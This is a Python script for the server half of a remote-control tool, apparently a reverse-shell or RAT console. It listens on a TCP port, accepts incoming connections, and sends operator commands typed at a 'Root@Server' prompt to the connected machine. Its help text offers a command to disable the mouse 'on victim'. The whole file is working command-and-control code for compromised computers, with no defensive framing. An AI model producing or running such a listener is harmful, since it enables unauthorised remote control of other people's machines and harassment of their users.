import socket
import threading
import time
import sys


# FOR EDITING UR PORT LOOK TO PRE-LAST BLOCK
# for change ip+port on client look to client file too


def wait_for_connection(s):
    while True:
        try:
            print("Waiting for connection...")
            conn, addr = s.accept()
            print("Connected by", addr)
            return conn
        except Exception as e:
            print(f"Error establishing connection: {e}")
            time.sleep(1)


def sending_comands_receiving_outs(conn):
    while True:
        try:
            command = input('Root@Server: ').encode('utf-8')
            if command.decode('utf-8') == 'exit_server':
                conn.close()
                sys.exit()
            elif command.decode('utf-8') == 'help':
                print(
                    'Available commands:\nexit_server: closing the connection\nhelp: printing this message\nmouse_off "seconds" or mo "seconds": turn off mouse on victim for a time\n')
            else:
                conn.send(command)
                data = conn.recv(1024)
                print("sucessfully sent, wait for the response")
                print(data.decode('utf-8'))
        except Exception as e:
            print(f"Error sending command: {e}")
            conn.close()
            break


if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #                  edit this
    #                  ||||
    s.bind(('0.0.0.0', 1212))
    s.listen(5)

    while True:
        conn = wait_for_connection(s)
        sending_thread = threading.Thread(target=sending_comands_receiving_outs, args=(conn,))
        sending_thread.start()
